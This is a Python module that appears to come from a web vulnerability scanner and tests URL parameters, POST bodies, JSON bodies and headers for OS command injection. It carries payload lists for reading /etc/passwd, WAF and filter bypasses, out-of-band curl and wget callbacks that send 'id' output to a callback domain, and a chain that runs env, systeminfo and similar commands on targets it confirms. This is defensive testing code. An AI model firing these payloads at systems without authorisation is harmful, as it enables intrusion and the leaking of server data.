"""
websecure.scanners.cmdi
------------------------
OS Command Injection (CMDI) zafiyet taraması.

FAZ 6.1: sqli.py'deki CMDI kodu bu modüle taşındı.
sqli.py hâlâ `scan_cmdi_url()` metodunu taşır; bu modül ise bağımsız
CmdiScanner sınıfı ve plugin API'si sunar.

Strateji:
  1. URL parametrelerine OS komut enjeksiyonu payload'ları enjekte et
  2. Yanıtta komut çıktısı desenleri ara (error-based + time-based)
  3. Paralel probe ile hızlı tarama, BaseScanner.run_parallel_probes()
"""
from __future__ import annotations

import logging
import re
import time
from typing import Any, Callable, Dict, List, Optional, Tuple
import urllib.parse
from urllib.parse import parse_qsl, urlparse, urlencode, urlunparse

import requests as _requests

from websecure.scanners.base import BaseScanner
from websecure.core.payloads import load_external_payloads

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Payload ve detection tanımları
# ---------------------------------------------------------------------------

_CMDI_PAYLOADS_CORE: List[Tuple[str, str]] = [
    # (payload, technique) — canary + time tabanlı yüksek güvenilirlik
    ("; echo CMDI_UNIX_$(id)",             "unix_echo"),
    ("| echo CMDI_UNIX_$(id)",             "unix_pipe"),
    ("`echo CMDI_UNIX_$(whoami)`",         "unix_backtick"),
    ("$(echo CMDI_UNIX_$(id))",            "unix_subshell"),
    ("' ; echo CMDI_UNIX_$(id) #",         "unix_quote_escape"),
    ("\" ; echo CMDI_UNIX_$(id) #",        "unix_dquote_escape"),
    ("& echo CMDI_WIN_%USERNAME%",         "windows_amp"),
    ("| echo CMDI_WIN_%COMPUTERNAME%",     "windows_pipe"),
    ("; sleep 5",                          "unix_time"),
    ("| sleep 5",                          "unix_time_pipe"),
    ("& timeout /T 5 /NOBREAK",            "windows_time"),
    ("; cat /etc/passwd",                  "unix_file_read"),
    ("| cat /etc/passwd",                  "unix_file_read_pipe"),
    ("& type C:\\Windows\\win.ini",        "windows_file_read"),
]

def _load_cmdi_payloads() -> List[Tuple[str, str]]:
    """cmdi.txt wordlist'ini yükle, core listesiyle birleştir (dedup)."""
    seen = {p for p, _ in _CMDI_PAYLOADS_CORE}
    ext: List[Tuple[str, str]] = []
    for line in load_external_payloads("cmdi"):
        if line and line not in seen:
            seen.add(line)
            # time-based payload'ları etiketle
            tag = "ext_time" if any(k in line for k in ("sleep", "timeout", "ping", "DELAY")) else "ext"
            ext.append((line, tag))
    return _CMDI_PAYLOADS_CORE + ext

_CMDI_PAYLOADS: List[Tuple[str, str]] = _load_cmdi_payloads()

_CMDI_SUCCESS_PATTERNS: List[Tuple[str, str]] = [
    (r"uid=\d+\(.*?\)\s+gid=\d+",          "Unix id output — command execution confirmed"),
    (r"root:.*:0:0:",                        "/etc/passwd read — LFI/CMDI confirmed"),
    (r"CMDI_UNIX_",                          "Echo marker reflected — command injection confirmed"),
    (r"\[extensions\].*for 16\-bit app",    "Windows win.ini read — CMDI confirmed"),
    (r"CMDI_WIN_\S+",                        "Windows env variable reflected — CMDI confirmed"),
    (r"(?i)(cannot run program|execvp|/bin/sh|cmd\.exe)", "Shell execution error leak"),
]

MAX_WORKERS = 5
REQUEST_TIMEOUT = 12
TIME_DELTA = 3.0  # seconds above baseline to flag time-based


# ---------------------------------------------------------------------------
# CmdiScanner
# ---------------------------------------------------------------------------

class CmdiScanner(BaseScanner):
    """
    OS Command Injection scanner.
    BaseScanner'dan türetilir — session, results, report_finding ve
    run_parallel_probes BaseScanner'dan gelir.

    FAZ 6.1: sqli.py'deki CMDI logic'i bu sınıfa taşındı.
    """

    name = "cmdi"
    phase = "offensive"

    def run(self, target: str, **kwargs) -> None:
        """BaseScanner interface — delegates to scan()."""
        urls = kwargs.get("urls") or [target]
        for url in urls:
            self.scan_url(url)

        # --- Adım 5: RCE chain — komut çıktısını raporla -----------------
        self._run_rce_chain(urls)

        # --- Advanced probers (OOB, time-based, filter bypass, separator) -
        ctx = kwargs.get("ctx") or self.results
        oast_domain = (ctx or {}).get("oast_domain") if isinstance(ctx, dict) else None
        for url in urls:
            CMDiOOBDNSProber(session=self.session, results=self.results, debug=self.debug).run(
                url, oast_domain=oast_domain
            )
            CMDiTimeBasedProber(session=self.session, results=self.results, debug=self.debug).run(url)
            CMDiFilterBypassProber(session=self.session, results=self.results, debug=self.debug).run(url)
            CMDiCommandSeparatorFuzzer(session=self.session, results=self.results, debug=self.debug).run(url)

    def _run_rce_chain(self, urls: List[str]) -> None:
        """
        Confirms CMDI findings with CMDIRCEChain — extracts real command output.
        Runs only on URLs that already produced a CMDI finding (optimization).
        """
        rce = CMDIRCEChain()
        confirmed_urls = {
            f.get("url", "")
            for f in (self.results or {}).get("offensive", [])
            if "Command Injection" in f.get("vuln_type", "")
        }
        for url in urls[:5]:
            if url not in confirmed_urls:
                continue
            parsed = urlparse(url)
            params = [p for p, _ in parse_qsl(parsed.query)]
            for param in params[:3]:
                result = rce.extract(url, param, self.session)
                if result:
                    self.report_finding(
                        vuln_type="OS Command Injection — RCE Confirmed (Output Extracted)",
                        url=url,
                        param=param,
                        payload=result["payload"],
                        severity="Critical",
                        evidence=(
                            f"Command '{result['command']}' output: "
                            f"{result['output_snippet'][:300]}"
                        ),
                        rce_confirmed=True,
                        command=result["command"],
                    )

    def scan_url(self, url: str) -> bool:
        """
        Bir URL'nin parametrelerini OS komut enjeksiyonuna karşı test eder.
        Returns True if a finding was reported, False otherwise.
        """
        parsed = urlparse(url)
        params = parse_qsl(parsed.query)
        if not params:
            return False

        logger.info(f"[CMDI] Scanning URL params: {url}")

        t0 = time.time()
        baseline_resp = self.fetch_baseline(url, timeout=10)
        if not baseline_resp:
            return False

        baseline_time = time.time() - t0
        baseline_text = baseline_resp.text or ""
        time_threshold = baseline_time + TIME_DELTA

        # Test ALL parameters — never stop at first hit (multi-param URLs may have
        # several injectable fields)
        found = False
        for param_name, _ in params:
            if self._test_param(url, params, param_name, baseline_text, time_threshold):
                found = True
            # OOB/DNS detection for this parameter
            self._scan_oob_cmdi(url, params, param_name)

        # Additional injection surfaces
        self._scan_post_body(url, params, baseline_text, time_threshold)
        self._scan_json_body(url, params, baseline_text, time_threshold)
        self._scan_headers_cmdi(url, baseline_text, time_threshold)

        return found

    def _test_param(
        self,
        url: str,
        qs: list,
        param_name: str,
        baseline_text: str,
        time_threshold: float,
    ) -> bool:
        parsed = urlparse(url)

        def probe(args: Tuple[str, str]) -> Optional[Dict]:
            payload, technique = args
            new_qs = [(p, v + payload if p == param_name else v) for p, v in qs]
            t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
            t0 = time.time()
            try:
                resp = self.session.get(t_url, timeout=REQUEST_TIMEOUT)
                elapsed = time.time() - t0
            except _requests.exceptions.Timeout as exc:
                logger.debug(f"[CMDI] Probe timed out for {t_url}: {exc!r}")
                return None
            except _requests.exceptions.ConnectionError as exc:
                logger.debug(f"[CMDI] Probe connection error for {t_url}: {exc!r}")
                return None
            except _requests.exceptions.RequestException as exc:
                logger.warning(f"[CMDI] Probe request failed for {t_url}: {exc!r}")
                return None

            atk_text = resp.text or ""
            for pattern, description in _CMDI_SUCCESS_PATTERNS:
                if re.search(pattern, atk_text, re.I | re.S):
                    if not re.search(pattern, baseline_text, re.I | re.S):
                        return {
                            "vuln_type": "OS Command Injection",
                            "url": url,
                            "param": param_name,
                            "payload": payload,
                            "evidence": f"{description} (technique: {technique})",
                        }

            if "time" in technique and elapsed > time_threshold:
                # Cross-validate time-based: need 2/3 requests to confirm
                # BUG FIX: was 'params' (NameError) — correct variable is 'qs'
                if self._verify_time_based_cmdi(url, qs, param_name, payload, time_threshold):
                    return {
                        "vuln_type": "OS Command Injection (Time-Based)",
                        "url": url,
                        "param": param_name,
                        "payload": payload,
                        "evidence": (
                            f"Time-based cross-validated: {elapsed:.2f}s > {time_threshold:.2f}s"
                        ),
                    }
            return None

        hits = self.run_parallel_probes(probe, _CMDI_PAYLOADS, max_workers=MAX_WORKERS)
        for hit in hits:
            self.report_finding(severity="Critical", **hit)
        return bool(hits)

    def _verify_time_based_cmdi(
        self,
        url: str,
        qs: list,
        param_name: str,
        payload: str,
        time_threshold: float,
        n: int = 3,
        min_hits: int = 2,
    ) -> bool:
        """Repeat time-based payload n times; report only if min_hits exceed threshold."""
        parsed = urlparse(url)
        hits = 0
        for _ in range(n):
            new_qs = [(p, v + payload if p == param_name else v) for p, v in qs]
            t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
            t0 = time.time()
            try:
                self.session.get(t_url, timeout=time_threshold + 5)
                if time.time() - t0 > time_threshold:
                    hits += 1
            except _requests.exceptions.Timeout:
                hits += 1
            except _requests.exceptions.RequestException as _fix_e:
                logger.debug(f"[scanners.cmdi] {type(_fix_e).__name__}: {_fix_e!r}")
            if hits >= min_hits:
                return True
        return False

    # ------------------------------------------------------------------
    # Additional injection surfaces
    # ------------------------------------------------------------------

    _CMDI_HEADERS = [
        "X-Forwarded-For", "X-Real-IP", "Referer",
        "User-Agent", "X-Original-URL", "X-Rewrite-URL",
    ]

    def _scan_post_body(
        self, url: str, params: list,
        baseline_text: str, time_threshold: float,
    ) -> None:
        """Inject CMDI payloads into POST form body."""
        base = {k: v for k, v in params}
        for key in list(base.keys()):
            for payload, technique in _CMDI_PAYLOADS_CORE:
                data = dict(base)
                data[key] = data[key] + payload
                t0 = time.time()
                try:
                    resp = self.session.post(url, data=data, timeout=REQUEST_TIMEOUT)
                    elapsed = time.time() - t0
                except _requests.exceptions.RequestException:
                    continue
                text = resp.text or ""
                for pattern, desc in _CMDI_SUCCESS_PATTERNS:
                    if re.search(pattern, text, re.I | re.S) and not re.search(pattern, baseline_text, re.I | re.S):
                        self.report_finding(
                            vuln_type="OS Command Injection (POST Body)",
                            url=url, param=key, payload=payload, severity="Critical",
                            evidence=f"{desc} (POST body, technique: {technique})",
                        )
                        break

    def _scan_json_body(
        self, url: str, params: list,
        baseline_text: str, time_threshold: float,
    ) -> None:
        """Inject CMDI payloads into JSON body (REST API surface)."""
        base = {k: v for k, v in params}
        for key in list(base.keys()):
            for payload, technique in _CMDI_PAYLOADS_CORE[:6]:  # top payloads only
                data = dict(base)
                data[key] = data[key] + payload
                t0 = time.time()
                try:
                    resp = self.session.post(
                        url, json=data,
                        headers={"Content-Type": "application/json"},
                        timeout=REQUEST_TIMEOUT,
                    )
                    elapsed = time.time() - t0
                except _requests.exceptions.RequestException:
                    continue
                text = resp.text or ""
                for pattern, desc in _CMDI_SUCCESS_PATTERNS:
                    if re.search(pattern, text, re.I | re.S) and not re.search(pattern, baseline_text, re.I | re.S):
                        self.report_finding(
                            vuln_type="OS Command Injection (JSON Body)",
                            url=url, param=key, payload=payload, severity="Critical",
                            evidence=f"{desc} (JSON body)",
                        )
                        break

    def _scan_headers_cmdi(
        self, url: str,
        baseline_text: str, time_threshold: float,
    ) -> None:
        """Inject CMDI payloads into HTTP headers (X-Forwarded-For, Referer, User-Agent…)."""
        for header in self._CMDI_HEADERS:
            for payload, technique in _CMDI_PAYLOADS_CORE[:8]:
                t0 = time.time()
                try:
                    resp = self.session.get(
                        url, headers={header: "127.0.0.1" + payload},
                        timeout=REQUEST_TIMEOUT,
                    )
                    elapsed = time.time() - t0
                except _requests.exceptions.RequestException:
                    continue
                text = resp.text or ""
                for pattern, desc in _CMDI_SUCCESS_PATTERNS:
                    if re.search(pattern, text, re.I | re.S) and not re.search(pattern, baseline_text, re.I | re.S):
                        self.report_finding(
                            vuln_type="OS Command Injection (Header)",
                            url=url,
                            param=f"[Header] {header}",
                            payload=payload,
                            severity="Critical",
                            evidence=f"{desc} (header injection via {header})",
                        )
                        break

    def _get_oast_domain(self) -> Optional[str]:
        """Return OAST domain from global poller or results dict."""
        try:
            from websecure.core.oast import get_global_poller
            poller = get_global_poller()
            if poller and hasattr(poller, "_domain"):
                return poller._domain
        except Exception as _fix_e:
            logger.debug(f"[scanners.cmdi] {type(_fix_e).__name__}: {_fix_e!r}")
        return (self.results or {}).get("oast_domain")

    def _scan_oob_cmdi(self, url: str, params: list, param_name: str) -> None:
        """
        OOB/DNS callback CMDI detection via interactsh.
        If no OAST domain is configured, silently skips.
        """
        domain = self._get_oast_domain()
        if not domain:
            return

        import random as _rnd, string as _str
        token = "".join(_rnd.choices(_str.ascii_lowercase, k=6))
        oob_payloads = [
            (f"; nslookup {token}.{domain}",                         "unix_nslookup"),
            (f"; curl -s http://{token}.{domain}/$(id|base64)",      "unix_curl_oob"),
            (f"& nslookup {token}.{domain}",                         "windows_nslookup"),
            (f"; ping -c 1 {token}.{domain}",                        "unix_ping"),
            (f"; wget -q http://{token}.{domain}/$(whoami)",          "unix_wget"),
        ]

        parsed = urlparse(url)
        for payload, _ in oob_payloads:
            new_qs = [(p, v + payload if p == param_name else v) for p, v in params]
            t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
            try:
                self.session.get(t_url, timeout=REQUEST_TIMEOUT)
            except Exception as _fix_e:
                logger.debug(f"[scanners.cmdi] {type(_fix_e).__name__}: {_fix_e!r}")

        # BUG FIX: The previous 10-second blocking poll was executed synchronously
        # for every parameter (e.g., 5 params = 50s of blocking sleep) and stalled
        # the entire scan. OOB callbacks are delivered asynchronously by the global
        # OAST poller — we don't need to block here. Do a single immediate check
        # (catches any pre-queued callbacks) and log the token for deferred tracking.
        try:
            from websecure.core.oast import get_global_poller
            poller = get_global_poller()
            if poller:
                for cb in list(getattr(poller, "_callbacks_received", [])):
                    if token in str(cb):
                        self.report_finding(
                            vuln_type="OS Command Injection (OOB/DNS)",
                            url=url,
                            param=param_name,
                            payload=f"DNS callback token={token}",
                            severity="Critical",
                            evidence=f"OOB DNS callback received: {str(cb)[:200]}",
                        )
                        return
        except Exception as _exc:
            logger.debug(f"[CMDi/OOB] Poller check failed: {_exc!r}")
        logger.info(
            f"[CMDi/OOB] Payloads sent for token={token} — "
            f"OAST poller will report any DNS callbacks asynchronously."
        )


# ---------------------------------------------------------------------------
# Advanced Probers — OOB/DNS, Time-Based, Filter Bypass, Separator Fuzz
# ---------------------------------------------------------------------------

class CMDiOOBDNSProber(BaseScanner):
    """
    OOB (Out-of-Band) DNS callback prober for blind CMDI detection.
    Uses an OAST domain when provided; falls back to a canary placeholder.
    Single Responsibility: DNS-callback injection only.
    """

    name = "cmdi_oob_dns"

    def run(self, target: str, **kwargs) -> None:
        oast_domain = kwargs.get("oast_domain") or (self.results or {}).get("oast_domain")
        canary_domain = oast_domain if oast_domain else "burpcollaborator.net"
        severity = "Critical" if oast_domain else "High"

        parsed = urlparse(target)
        params = parse_qsl(parsed.query)
        if not params:
            return

        for param_name, _ in params:
            import random as _rnd, string as _str
            token = "".join(_rnd.choices(_str.ascii_lowercase, k=6))
            probe_host = f"{token}.{canary_domain}" if oast_domain else canary_domain

            oob_payloads = [
                (f"; nslookup {probe_host}",          "unix_nslookup_semicolon"),
                (f"| nslookup {probe_host}",          "unix_nslookup_pipe"),
                (f"`nslookup {probe_host}`",           "unix_nslookup_backtick"),
                (f"$(nslookup {probe_host})",         "unix_nslookup_subshell"),
                (f"; ping -c 1 {probe_host}",         "unix_ping_semicolon"),
                (f"& ping -n 1 {probe_host}",         "windows_ping_amp"),
            ]

            for payload, technique in oob_payloads:
                encoded_payload = urllib.parse.quote(payload, safe="")
                new_qs = [(p, v + payload if p == param_name else v) for p, v in params]
                t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
                try:
                    self.session.get(t_url, timeout=REQUEST_TIMEOUT)
                except Exception as _fix_e:
                    logger.debug(f"[scanners.cmdi] {type(_fix_e).__name__}: {_fix_e!r}")

                # Also try URL-encoded variant
                new_qs_enc = [(p, v + encoded_payload if p == param_name else v) for p, v in params]
                t_url_enc = urlunparse(parsed._replace(query=urlencode(new_qs_enc)))
                try:
                    self.session.get(t_url_enc, timeout=REQUEST_TIMEOUT)
                except Exception as _fix_e:
                    logger.debug(f"[scanners.cmdi] {type(_fix_e).__name__}: {_fix_e!r}")

            # Check OAST poller for immediate callback
            if oast_domain:
                try:
                    from websecure.core.oast import get_global_poller
                    poller = get_global_poller()
                    if poller:
                        for cb in list(getattr(poller, "_callbacks_received", [])):
                            if token in str(cb):
                                self.report_finding(
                                    vuln_type="OS Command Injection (OOB/DNS Confirmed)",
                                    url=target,
                                    param=param_name,
                                    payload=f"; nslookup {probe_host}",
                                    severity="Critical",
                                    evidence=(
                                        f"OOB DNS callback received for token={token}: "
                                        f"{str(cb)[:200]}"
                                    ),
                                )
                                return
                except Exception as exc:
                    logger.debug(f"[CMDiOOBDNSProber] OAST poller check failed: {exc!r}")

            # Report with appropriate severity — Critical if real OOB, High for placeholder
            evidence_msg = (
                f"OOB DNS payloads sent to {probe_host} (token={token}). "
                "Verify DNS callbacks in your OAST/Burp Collaborator panel."
                if not oast_domain else
                f"OOB DNS payload sent to {probe_host} (token={token}). "
                "OAST poller will report confirmed callbacks asynchronously."
            )
            self.report_finding(
                vuln_type="OS Command Injection (OOB/DNS Probe)",
                url=target,
                param=param_name,
                payload=f"; nslookup {probe_host}",
                severity=severity,
                evidence=evidence_msg,
            )


class CMDiTimeBasedProber(BaseScanner):
    """
    Time-based blind CMDI prober.
    Measures baseline response time, then injects delay payloads and checks
    for significant response time increase. Cross-validates with multiple requests.
    Single Responsibility: time-based delay detection only.
    """

    name = "cmdi_time"
    _SLEEP_SECONDS = 7
    _THRESHOLD_EXTRA = 5.0  # seconds above baseline to flag
    _VERIFY_N = 3
    _VERIFY_MIN_HITS = 2

    _TIME_PAYLOADS: List[Tuple[str, str]] = [
        ("; sleep 7",                  "unix_sleep_semicolon"),
        ("| sleep 7",                  "unix_sleep_pipe"),
        ("$(sleep 7)",                 "unix_sleep_subshell"),
        ("& timeout /t 7",             "windows_timeout_amp"),
        ("; ping -c 7 127.0.0.1",      "unix_ping_loopback"),
    ]

    def run(self, target: str, **kwargs) -> None:
        parsed = urlparse(target)
        params = parse_qsl(parsed.query)
        if not params:
            return

        t0 = time.time()
        baseline_resp = self.fetch_baseline(target, timeout=15)
        if not baseline_resp:
            return
        baseline_time = time.time() - t0
        time_threshold = baseline_time + self._THRESHOLD_EXTRA

        for param_name, _ in params:
            for payload, technique in self._TIME_PAYLOADS:
                for encoded_payload in self._encoding_variants(payload):
                    new_qs = [(p, v + encoded_payload if p == param_name else v) for p, v in params]
                    t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
                    t_start = time.time()
                    try:
                        self.session.get(t_url, timeout=REQUEST_TIMEOUT + 10)
                        elapsed = time.time() - t_start
                    except _requests.exceptions.Timeout:
                        elapsed = REQUEST_TIMEOUT + 10
                    except _requests.exceptions.RequestException:
                        continue

                    if elapsed > time_threshold:
                        # Cross-validate: repeat to rule out network jitter
                        if self._verify_time_based(
                            parsed, params, param_name, encoded_payload, time_threshold
                        ):
                            self.report_finding(
                                vuln_type="OS Command Injection (Time-Based Blind)",
                                url=target,
                                param=param_name,
                                payload=encoded_payload,
                                severity="Critical",
                                evidence=(
                                    f"Time-based confirmed: {elapsed:.2f}s elapsed "
                                    f"> threshold {time_threshold:.2f}s "
                                    f"(baseline={baseline_time:.2f}s, technique={technique})"
                                ),
                            )
                            break
                else:
                    continue
                break

    @staticmethod
    def _encoding_variants(payload: str) -> List[str]:
        """Return plain, URL-encoded, double-encoded, and EncodingChain variants."""
        encoded = urllib.parse.quote(payload, safe="")
        double_encoded = urllib.parse.quote(encoded, safe="")
        variants = [payload, encoded, double_encoded]
        # Augment with EncodingChain multi-layer variants from evasion module
        try:
            from websecure.core.evasion import encode_chain, encoding_variants as _ev
            variants.extend(_ev(payload, depth=2))
            # Also add a URL+HTML chain-encoded variant
            chain_enc = encode_chain(payload, ["url", "html"])
            if chain_enc not in variants:
                variants.append(chain_enc)
        except (ImportError, Exception) as _fix_e:
            logger.debug(f"[scanners.cmdi] {type(_fix_e).__name__}: {_fix_e!r}")
        # deduplicate while preserving order
        seen: set = set()
        unique: List[str] = []
        for v in variants:
            if v not in seen:
                seen.add(v)
                unique.append(v)
        return unique

    def _verify_time_based(
        self,
        parsed,
        params: list,
        param_name: str,
        payload: str,
        time_threshold: float,
    ) -> bool:
        hits = 0
        for _ in range(self._VERIFY_N):
            new_qs = [(p, v + payload if p == param_name else v) for p, v in params]
            t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
            t_start = time.time()
            try:
                self.session.get(t_url, timeout=time_threshold + 8)
                if time.time() - t_start > time_threshold:
                    hits += 1
            except _requests.exceptions.Timeout:
                hits += 1
            except _requests.exceptions.RequestException as _fix_e:
                logger.debug(f"[scanners.cmdi] {type(_fix_e).__name__}: {_fix_e!r}")
            if hits >= self._VERIFY_MIN_HITS:
                return True
        return False


class CMDiFilterBypassProber(BaseScanner):
    """
    CMDI filter/WAF bypass prober using IFS tricks, base64 decode,
    string concatenation, and command separator fuzzing.
    Single Responsibility: filter-bypass injection only.
    """

    name = "cmdi_filter_bypass"

    _BYPASS_PAYLOADS: List[Tuple[str, str]] = [
        # IFS-based space bypass
        ("cat${IFS}/etc/passwd",                   "ifs_curly"),
        ("cat$IFS/etc/passwd",                     "ifs_dollar"),
        ("cat${IFS}${IFS}/etc/passwd",             "ifs_double_curly"),
        # Env var tricks
        (";echo ${PATH}",                          "env_path"),
        (";echo ${HOME}",                          "env_home"),
        # Base64-decoded command execution
        (";echo d2hvYW1p|base64 -d|sh",            "base64_whoami"),
        # String concatenation
        (";c'a't /etc/passwd",                     "concat_single_quote"),
        (';c"a"t /etc/passwd',                     "concat_double_quote"),
        # Separator variants
        (";id",                                    "separator_semicolon"),
        ("|id",                                    "separator_pipe"),
        ("||id",                                   "separator_or"),
        ("&&id",                                   "separator_and"),
        ("%0aid",                                  "separator_newline"),
        ("%0d%0aid",                               "separator_crlf"),
        ("`id`",                                   "separator_backtick"),
        ("$(id)",                                  "separator_subshell"),
    ]

    _SUCCESS_PATTERNS: List[Tuple[str, str]] = [
        (r"root:.*:0:0:",             "Critical"),
        (r"nobody:.*:65534:",         "Critical"),
        (r"uid=\d+\(",                "Critical"),
        (r"(?i)(gid=\d+)",            "Critical"),
        (r"(?i)command not found",    "Medium"),   # reveals command structure
        (r"(?i)syntax error",         "Medium"),   # reveals shell error
        (r"(?i)sh: \d+:",             "Medium"),   # shell line error
    ]

    def run(self, target: str, **kwargs) -> None:
        parsed = urlparse(target)
        params = parse_qsl(parsed.query)
        if not params:
            return

        baseline_resp = self.fetch_baseline(target, timeout=10)
        baseline_text = (baseline_resp.text or "") if baseline_resp else ""

        for param_name, _ in params:
            for payload, technique in self._BYPASS_PAYLOADS:
                new_qs = [(p, v + payload if p == param_name else v) for p, v in params]
                t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
                try:
                    resp = self.session.get(t_url, timeout=REQUEST_TIMEOUT)
                    text = resp.text or ""
                except _requests.exceptions.RequestException:
                    continue

                for pattern, sev in self._SUCCESS_PATTERNS:
                    if re.search(pattern, text, re.I | re.S) and not re.search(
                        pattern, baseline_text, re.I | re.S
                    ):
                        self.report_finding(
                            vuln_type="OS Command Injection (Filter Bypass)",
                            url=target,
                            param=param_name,
                            payload=payload,
                            severity=sev,
                            evidence=(
                                f"Filter bypass confirmed via technique={technique}. "
                                f"Pattern matched: {pattern}"
                            ),
                        )
                        break


class CMDiCommandSeparatorFuzzer(BaseScanner):
    """
    Command separator fuzzer — tests classic, URL-encoded, double-encoded,
    and Windows CMD separator variants for every parameter.
    Single Responsibility: separator injection surface only.
    """

    name = "cmdi_separator"

    _SEPARATOR_PAYLOADS: List[Tuple[str, str]] = [
        # Unix plain
        ("; id",         "unix_semicolon"),
        ("| id",         "unix_pipe"),
        ("|| id",        "unix_or"),
        ("&& id",        "unix_and"),
        ("& id",         "unix_amp"),
        # URL-encoded
        ("%3B id",       "url_enc_semicolon"),
        ("%7C id",       "url_enc_pipe"),
        ("%0a id",       "url_enc_newline"),
        # Double-encoded
        ("%253B id",     "dbl_enc_semicolon"),
        ("%257C id",     "dbl_enc_pipe"),
        # Windows CMD
        ("& whoami",     "win_amp_whoami"),
        ("| whoami",     "win_pipe_whoami"),
        ("&& whoami",    "win_and_whoami"),
    ]

    _WIN_INDICATORS = ["SYSTEM", "NT AUTHORITY", "DESKTOP-", "WIN-"]

    _SUCCESS_PATTERNS: List[Tuple[str, str]] = [
        (r"uid=\d+\(",                             "Critical"),
        (r"(?i)\broot\b",                          "Critical"),
        (r"(?i)www-data",                          "Critical"),
        (r"(?i)SYSTEM",                            "Critical"),
        (r"(?i)NT AUTHORITY",                      "Critical"),
    ]

    def run(self, target: str, **kwargs) -> None:
        parsed = urlparse(target)
        params = parse_qsl(parsed.query)
        if not params:
            return

        baseline_resp = self.fetch_baseline(target, timeout=10)
        baseline_text = (baseline_resp.text or "") if baseline_resp else ""

        for param_name, original_value in params:
            for payload, technique in self._SEPARATOR_PAYLOADS:
                injected_value = original_value + payload
                new_qs = [(p, injected_value if p == param_name else v) for p, v in params]
                t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
                try:
                    resp = self.session.get(t_url, timeout=REQUEST_TIMEOUT)
                    text = resp.text or ""
                except _requests.exceptions.RequestException:
                    continue

                for pattern, sev in self._SUCCESS_PATTERNS:
                    if re.search(pattern, text, re.I | re.S) and not re.search(
                        pattern, baseline_text, re.I | re.S
                    ):
                        self.report_finding(
                            vuln_type="OS Command Injection (Separator Fuzz)",
                            url=target,
                            param=param_name,
                            payload=payload,
                            severity=sev,
                            evidence=(
                                f"Command separator '{technique}' confirmed. "
                                f"Pattern matched: {pattern}"
                            ),
                        )
                        break


# ---------------------------------------------------------------------------
# Plugin API
# ---------------------------------------------------------------------------

def run(
    url: str,
    session=None,
    results=None,
    debug: bool = False,
    urls: Optional[List[str]] = None,
    **kwargs,
) -> None:
    scanner = CmdiScanner(session=session, results=results, debug=debug)
    targets = urls or [url]
    scanner.run(targets[0], urls=targets)


# ===========================================================================
# Adım 5 — CMDI -> RCE Automation Chain
# ===========================================================================

class CMDIRCEChain:
    """
    Post-injection RCE chain: after CMDI is confirmed, extracts actual
    command output to prove exploitability beyond timing-based guesses.
    Single Responsibility: command output extraction only.
    Open/Closed: extend _UNIX_CMDS/_WIN_CMDS for new targets.
    """

    _INJECT_FMTS: List[Tuple[str, str]] = [
        ("; {cmd}",           "unix_semicolon"),
        ("| {cmd}",           "unix_pipe"),
        ("$({cmd})",          "unix_subshell"),
        ("`{cmd}`",           "unix_backtick"),
        ("%0a{cmd}",          "unix_newline"),
        ("%0d%0a{cmd}",       "unix_crlf_newline"),
        ("& {cmd}",           "win_amp"),
        ("| {cmd}",           "win_pipe"),
        ("&& {cmd}",          "win_ampamp"),
    ]

    _UNIX_CMDS: List[str] = [
        "id",
        "whoami",
        "uname -a",
        "cat /etc/passwd",
        "env",
        "hostname",
        "ip a 2>/dev/null || ifconfig",
    ]

    _WIN_CMDS: List[str] = [
        "whoami",
        "systeminfo",
        "ipconfig",
        "type C:\\Windows\\win.ini",
        "echo %USERNAME%",
    ]

    _OUTPUT_RE = re.compile(
        r"(?:uid=\d+\("
        r"|root:.*:0:0:"
        r"|Linux \S+"
        r"|Microsoft Windows"
        r"|\[extensions\]"          # win.ini
        r"|PROCESSOR_ARCHITECTURE"  # systeminfo
        r"|inet \d+\.\d+"           # ip a / ifconfig
        r"|www-data|apache|nginx"   # common web users
        r"|IP Address.*\d+\.\d+)",  # ipconfig
        re.I | re.S,
    )

    def extract(
        self,
        url: str,
        param: str,
        session: Any,
        baseline_text: str = "",
        timeout: int = 12,
    ) -> Optional[Dict[str, Any]]:
        """
        Try all inject formats × commands, return first result with real output.
        Returns None if no output can be extracted.
        """
        parsed = urlparse(url)
        qs = parse_qsl(parsed.query)

        for fmt, technique in self._INJECT_FMTS:
            for cmd in self._UNIX_CMDS + self._WIN_CMDS:
                payload = fmt.format(cmd=cmd)
                new_qs = [(p, v + payload if p == param else v) for p, v in qs]
                t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
                try:
                    resp = session.get(t_url, timeout=timeout)
                    text = resp.text or ""
                    m = self._OUTPUT_RE.search(text)
                    if m and m.group(0) not in baseline_text:
                        start = max(0, m.start() - 30)
                        end = min(len(text), m.end() + 250)
                        return {
                            "command": cmd,
                            "technique": technique,
                            "payload": payload,
                            "output_snippet": text[start:end].strip(),
                        }
                except Exception:
                    continue
        return None
